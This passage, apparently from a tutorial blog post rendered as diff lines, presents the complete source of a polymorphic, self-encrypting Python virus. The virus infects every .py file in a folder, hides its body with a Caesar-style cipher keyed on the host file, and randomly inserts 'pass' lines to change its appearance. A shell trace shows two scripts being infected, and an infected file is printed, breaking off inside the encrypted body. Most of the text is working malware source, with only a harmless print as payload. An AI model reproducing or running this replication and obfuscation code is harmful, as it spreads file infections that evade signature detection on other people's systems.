+    <span style="color:#66d9ef">for</span> text <span style="color:#f92672">in</span> functions:
+        <span style="color:#66d9ef">if</span> text:
+            code_without_pass <span style="color:#f92672">=</span> delete_pass(text)
+            code_with_pass <span style="color:#f92672">=</span> add_pass(code_without_pass)
+            new_code<span style="color:#f92672">.</span>append(code_with_pass)
+        <span style="color:#66d9ef">else</span>:
+            new_code<span style="color:#f92672">.</span>append(text)
+    <span style="color:#66d9ef">return</span> separator<span style="color:#f92672">.</span>join(new_code)
+</code></pre></div><ul>
+<li><strong>infect</strong> function: this function does the same as before, but now:
+<ul>
+<li>Instead of getting the part and clear and the part to be encrypted using a fixed value, you get by looking for the 
+position of the cipher function.</li>
+<li>The function modify is called so the code that is not encrypted is different.</li>
+<li>The decrypter code no longer has the fixed value to indicate the length of the decrypted part; it is now calculated 
+based on the size of the modified code.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> text_script:
+                plain_part <span style="color:#f92672">=</span> virus[:virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def encrypt&#34;</span>)]
+                part_to_encrypt <span style="color:#f92672">=</span> virus[virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def encrypt&#34;</span>):]
+                modified_plain_part <span style="color:#f92672">=</span> modify(plain_part)
+                key <span style="color:#f92672">=</span> calculate_key(text_script)
+                encrypted_part <span style="color:#f92672">=</span> encrypt(part_to_encrypt, key)
+                script<span style="color:#f92672">.</span>write(modified_plain_part)
+                decrypter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host_text = host.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;plain_part = host_text[host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+&#34;</span> <span style="color:#f92672">+</span> str(len(modified_plain_part)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;key = calculate_key(host_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;decrypted_text = decrypt(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> encrypted_part <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, key)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(decrypted_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;run(plain_part + decrypted_text)&#34;</span>
+                script<span style="color:#f92672">.</span>write(decrypter)
+            script<span style="color:#f92672">.</span>close()
+</code></pre></div><p>The other functions of the germ (calculate_key, decrypt, encrypt, payload, and run) and global code have not changed. 
+That said, the full code for this germ is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_key</span>(text):
+    <span style="color:#66d9ef">if</span> len(text) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        key <span style="color:#f92672">=</span> ord(text[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
+    encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            encrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> encrypted_text
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_pass</span>(code):
+    code_without_pass <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> code<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>)):
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">in</span> line:
+            code_without_pass<span style="color:#f92672">.</span>append(line)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(code_without_pass)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_tabulation</span>(code, position):
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;else&#34;</span> <span style="color:#f92672">in</span> code[position] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;elif&#34;</span> <span style="color:#f92672">in</span> code[position]:
+        <span style="color:#66d9ef">return</span> len(code[position]) <span style="color:#f92672">-</span> len(code[position]<span style="color:#f92672">.</span>lstrip()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+    <span style="color:#66d9ef">return</span> len(code[position]) <span style="color:#f92672">-</span> len(code[position]<span style="color:#f92672">.</span>lstrip())
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_pass</span>(code):
+    <span style="color:#f92672">import</span> random
+    lines <span style="color:#f92672">=</span> code<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        <span style="color:#66d9ef">if</span> random<span style="color:#f92672">.</span>random() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.75</span>:
+            insertion_position <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, len(lines) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+            lines<span style="color:#f92672">.</span>insert(insertion_position, <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> calculate_tabulation(lines, insertion_position) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pass&#34;</span>)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(lines)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify</span>(code):
+    new_code <span style="color:#f92672">=</span> []
+    separator <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>)
+    functions <span style="color:#f92672">=</span> code<span style="color:#f92672">.</span>split(separator)
+    <span style="color:#66d9ef">for</span> text <span style="color:#f92672">in</span> functions:
+        <span style="color:#66d9ef">if</span> text:
+            code_without_pass <span style="color:#f92672">=</span> delete_pass(text)
+            code_with_pass <span style="color:#f92672">=</span> add_pass(code_without_pass)
+            new_code<span style="color:#f92672">.</span>append(code_with_pass)
+        <span style="color:#66d9ef">else</span>:
+            new_code<span style="color:#f92672">.</span>append(text)
+    <span style="color:#66d9ef">return</span> separator<span style="color:#f92672">.</span>join(new_code)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> text_script:
+                plain_part <span style="color:#f92672">=</span> virus[:virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def encrypt&#34;</span>)]
+                part_to_encrypt <span style="color:#f92672">=</span> virus[virus<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def encrypt&#34;</span>):]
+                modified_plain_part <span style="color:#f92672">=</span> modify(plain_part)
+                key <span style="color:#f92672">=</span> calculate_key(text_script)
+                encrypted_part <span style="color:#f92672">=</span> encrypt(part_to_encrypt, key)
+                script<span style="color:#f92672">.</span>write(modified_plain_part)
+                decrypter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host_text = host.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;plain_part = host_text[host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+&#34;</span> <span style="color:#f92672">+</span> str(len(modified_plain_part)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;key = calculate_key(host_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;decrypted_text = decrypt(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> encrypted_part <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, key)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(decrypted_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;run(plain_part + decrypted_text)&#34;</span>
+                script<span style="color:#f92672">.</span>write(decrypter)
+            script<span style="color:#f92672">.</span>close()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You were infected&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(virus):
+    infect(virus)
+    payload()
+
+
+<span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> host_text[:<span style="color:#ae81ff">3450</span>]
+run(virus)
+</code></pre></div><p>If we run the germ in a folder with several files with .py extension we will get the following trace:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ ls -las
+total <span style="color:#ae81ff">20</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 19:11 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 18:32 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">41</span> Dec <span style="color:#ae81ff">13</span> 19:11 hello2.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">22</span> Dec <span style="color:#ae81ff">13</span> 19:11 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3567</span> Dec <span style="color:#ae81ff">13</span> 19:08 virus.py
+probasvx@probasvx:~/virus3$ cat hello.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello world!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus3$ cat hello2.py 
+<span style="color:#75715e"># Comment</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello another time :)&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus3$ python3 virus.py 
+You were infected
+probasvx@probasvx:~/virus3$ ls -las
+total <span style="color:#ae81ff">20</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 19:11 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 18:32 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3817</span> Dec <span style="color:#ae81ff">13</span> 19:58 hello2.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3862</span> Dec <span style="color:#ae81ff">13</span> 19:58 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">3567</span> Dec <span style="color:#ae81ff">13</span> 19:08 virus.py
+</code></pre></div><p>In the trace it can be seen that the size of the file hello2.py, before the execution of the virus, had 19 bytes more 
+than hello.py. After running the virus, hello.py is 45 bytes largest. This is due to the number and position of &ldquo;pass&rdquo; 
+inserted in the unencrypted code of the virus. The following are the codes for each file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ cat hello.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello world!&#34;</span><span style="color:#f92672">)</span>
+def calculate_key<span style="color:#f92672">(</span>text<span style="color:#f92672">)</span>:
+    <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>text<span style="color:#f92672">)</span> &gt;<span style="color:#f92672">=</span> 3:
+        key <span style="color:#f92672">=</span> ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>
+        pass
+        pass
+        pass
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+def decrypt<span style="color:#f92672">(</span>text, key<span style="color:#f92672">)</span>:
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character in text:
+        <span style="color:#66d9ef">if</span> character.isupper<span style="color:#f92672">()</span>:
+            decrypted_text <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>character<span style="color:#f92672">)</span> - key - 65<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 65<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">elif</span> character.islower<span style="color:#f92672">()</span>:
+            pass
+            decrypted_text <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>character<span style="color:#f92672">)</span> - key - 97<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 97<span style="color:#f92672">)</span>
+            pass
+        <span style="color:#66d9ef">else</span>:
+            pass
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus3$ cat hello2.py 
+<span style="color:#75715e"># Comment</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello another time :)&#34;</span><span style="color:#f92672">)</span>
+def calculate_key<span style="color:#f92672">(</span>text<span style="color:#f92672">)</span>:
+    pass
+    <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>text<span style="color:#f92672">)</span> &gt;<span style="color:#f92672">=</span> 3:
+        key <span style="color:#f92672">=</span> ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span> + ord<span style="color:#f92672">(</span>text<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+def decrypt<span style="color:#f92672">(</span>text, key<span style="color:#f92672">)</span>:
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character in text:
+        <span style="color:#66d9ef">if</span> character.isupper<span style="color:#f92672">()</span>:
+            pass
+            decrypted_text <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>character<span style="color:#f92672">)</span> - key - 65<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 65<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">elif</span> character.islower<span style="color:#f92672">()</span>:
+            decrypted_text <span style="color:#f92672">+=</span> chr<span style="color:#f92672">((</span>ord<span style="color:#f92672">(</span>character<span style="color:#f92672">)</span> - key - 97<span style="color:#f92672">)</span> % <span style="color:#ae81ff">26</span> + 97<span style="color:#f92672">)</span>
+        <span style="color:#66d9ef">else</span>:
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+</code></pre></div><p>The complete code of an infected file is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Hello world!&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_key</span>(text):
+    <span style="color:#66d9ef">if</span> len(text) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        key <span style="color:#f92672">=</span> ord(text[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">2</span>])
+        <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">pass</span>
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            <span style="color:#66d9ef">pass</span>
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+            <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">pass</span>
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+
+
+<span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+plain_part <span style="color:#f92672">=</span> host_text[host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>):host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">608</span>]
+key <span style="color:#f92672">=</span> calculate_key(host_text)
+decrypted_text <span style="color:#f92672">=</span> decrypt(<span style="color:#e6db74">&#34;&#34;&#34;wxy xgvkrim(mxqm, dxr):
+</span><span style="color:#e6db74">    xgvkrimxw_mxqm = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vatktvmxk bg mxqm:
+</span><span style="color:#e6db74">        by vatktvmxk.blniixk():
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 65) % 26 + 65)
+</span><span style="color:#e6db74">        xeby vatktvmxk.blehpxk():
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 97) % 26 + 97)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vatktvmxk
+</span><span style="color:#e6db74">    kxmnkg xgvkrimxw_mxqm
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy wxexmx_itll(vhwx):
+</span><span style="color:#e6db74">    vhwx_pbmahnm_itll = []
+</span><span style="color:#e6db74">    yhk ebgx bg vhwx.liebm(vak(10)):
+</span><span style="color:#e6db74">        by ghm &#34;itll&#34; bg ebgx:
+</span><span style="color:#e6db74">            vhwx_pbmahnm_itll.tiixgw(ebgx)
+</span><span style="color:#e6db74">    kxmnkg vak(10).chbg(vhwx_pbmahnm_itll)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy vtevnetmx_mtunetmbhg(vhwx, ihlbmbhg):
+</span><span style="color:#e6db74">    by &#34;xelx&#34; bg vhwx[ihlbmbhg] hk &#34;xeby&#34; bg vhwx[ihlbmbhg]:
+</span><span style="color:#e6db74">        kxmnkg exg(vhwx[ihlbmbhg]) - exg(vhwx[ihlbmbhg].elmkbi()) + 4
+</span><span style="color:#e6db74">    kxmnkg exg(vhwx[ihlbmbhg]) - exg(vhwx[ihlbmbhg].elmkbi())
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy tww_itll(vhwx):
+</span><span style="color:#e6db74">    bfihkm ktgwhf
